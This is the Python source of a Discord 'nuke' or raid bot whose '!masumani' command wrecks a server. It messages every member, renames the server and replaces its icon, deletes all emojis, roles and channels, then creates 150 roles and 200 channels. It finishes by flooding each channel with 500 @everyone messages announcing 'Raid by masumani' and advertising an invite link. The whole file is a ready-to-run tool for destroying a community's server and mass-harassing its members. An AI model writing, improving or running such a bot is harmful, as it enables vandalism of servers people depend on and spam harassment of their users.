
    import discord
    from discord.ext import commands
    import asyncio
    import aiohttp
    import random
    import os
    from dotenv import load_dotenv

    # .env 読み込み
    load_dotenv()
    TOKEN = os.getenv("TOKEN")

    # Intentsの設定
    intents = discord.Intents.default()
    intents.message_content = True
    intents.guilds = True
    intents.members = True

    # Botの作成
    bot = commands.Bot(command_prefix='!', intents=intents)

    @bot.event
    async def on_ready():
        print(f'{bot.user} ログインしました')
        print(f'Bot ID: {bot.user.id}')
        print('——')

    @bot.command()
    async def masumani(ctx):
        """
        サーバーを完全にリセットするコマンド
        使用例: !masumani
        """

        # ===== 設定 =====
        new_server_name = "ますまに共栄圏植民地｜MSMN"
        icon_url = "https://i.imgur.com/uMaj6CP.jpeg"
        channel_name = "ますまに共栄圏最強"
        channel_count = 200
        spam_message = "# このサーバーはますまに共栄圏によって荒らされました\nRaid by masumani\ndiscord.gg/msmn\n@everyone\nhttps://cdn.discordapp.com/attachments/1236663988914229308/1287064282256900246/copy_89BE23AC-0647-468A-A5B9-504B5A98BC8B.gif?ex=68cf68c5&is=68ce1745&hm=1250d2c6de152cc6caab5c1b51f27163fdaa0ebff883fbbe7983959cdda7d782&"
        spam_count = 500
        role_name = "ますまに共栄圏に荒らされました"
        role_count = 150

        # ===== コマンド削除 =====
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            await ctx.send("AutoModやアンチレイドに十分な権限がありません。", delete_after=5)

        guild = ctx.guild
        old_server_name = guild.name
        user = ctx.author

        await user.send("**処理を開始します...**")

        # ===== メンバーDM =====
        dm_count = 0
        for member in guild.members:
            if not member.bot:
                try:
                    await member.send(f"「{old_server_name}」をリセットしました")
                    dm_count += 1
                except:
                    pass
        await user.send(f"✅ DM送信完了: {dm_count}人に送信しました")

        # ===== サーバーアイコン変更 =====
        icon_bytes = None
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url) as resp:
                    if resp.status == 200:
                        icon_bytes = await resp.read()
                        await guild.edit(icon=icon_bytes)
                        await user.send(f"✅ アイコン変更完了")
        except Exception as e:
            await user.send(f"⚠️ アイコン変更失敗: {e}")

        # ===== サーバー名変更 =====
        try:
            await guild.edit(name=new_server_name)
            await user.send(f"✅ サーバー名変更: {old_server_name} → {new_server_name}")
        except Exception as e:
            await user.send(f"⚠️ サーバー名変更失敗: {e}")

        # ===== 絵文字削除 =====
        emoji_deleted = 0
        for emoji in guild.emojis:
            try:
                await emoji.delete()
                emoji_deleted += 1
            except:
                pass
        await user.send(f"✅ 絵文字削除: {emoji_deleted}個")

        # ===== 絵文字作成 =====
        emoji_created = 0
        if icon_bytes:
            max_emojis = guild.emoji_limit
            for i in range(max_emojis):
                try:
                    await guild.create_custom_emoji(name=f"emoji{i}", image=icon_bytes)
                    emoji_created += 1
                    await asyncio.sleep(0.3)
                except:
                    break
        await user.send(f"✅ 絵文字作成: {emoji_created}個")

        # ===== ロール削除 =====
        role_deleted = 0
        for role in guild.roles:
            if role.name != "@everyone" and not role.managed:
                try:
                    await role.delete()
                    role_deleted += 1
                except:
                    pass
        await user.send(f"✅ ロール削除: {role_deleted}個")

        # ===== ロール作成 =====
        role_created = 0
        for i in range(role_count):
            try:
                color = discord.Color.from_rgb(
                    random.randint(50, 255),
                    random.randint(50, 255),
                    random.randint(50, 255)
                )
                await guild.create_role(name=role_name, color=color)
                role_created += 1
                await asyncio.sleep(0.1)
            except:
                pass
        await user.send(f"✅ ロール作成: {role_created}個")

        # ===== チャンネル削除 =====
        deleted_count = 0
        for channel in guild.channels:
            try:
                await channel.delete()
                deleted_count += 1
            except:
                pass
        await user.send(f"✅ チャンネル削除: {deleted_count}個")

        # ===== チャンネル作成 =====
        created_channels = []
        tasks = []
        created_count = 0

        for i in range(channel_count):
            tasks.append(guild.create_text_channel(name=channel_name))
            if len(tasks) >= 5:
                results = await asyncio.gather(*tasks, return_exceptions=True)
                for res in results:
                    if not isinstance(res, Exception):
                        created_channels.append(res)
                        created_count += 1
                tasks = []
                await asyncio.sleep(0.5)
        if tasks:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for res in results:
                if not isinstance(res, Exception):
                    created_channels.append(res)
                    created_count += 1
        await user.send(f"✅ チャンネル作成: {created_count}個")

        # ===== メッセージ送信 =====
        total_messages = 0
        for channel in created_channels:
            for _ in range(spam_count):
                try:
                    await channel.send(spam_message)
                    total_messages += 1
                except:
                    pass
        await user.send(f"✅ メッセージ送信: {total_messages}件")

        # ===== 完了通知 =====
        await user.send(
            f"🎉 **全ての処理が完了しました！**\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📧 DM送信: {dm_count}人\n"
            f"😀 絵文字削除: {emoji_deleted}個\n"
            f"😀 絵文字作成: {emoji_created}個\n"
            f"👥 ロール削除: {role_deleted}個\n"
            f"🌈 ロール作成: {role_created}個\n"
            f"🗑️ チャンネル削除: {deleted_count}個\n"
            f"📂 チャンネル作成: {created_count}個\n"
            f"💬 メッセージ送信: {total_messages}件"
        )

    # ===== エラーハンドラー =====
    @masumani.error
    async def masumani_error(ctx, error):
        await ctx.send(f"❌ エラーが発生しました: {error}")

    # ===== Bot起動 =====
    if __name__ == "__main__":
        bot.run(TOKEN) 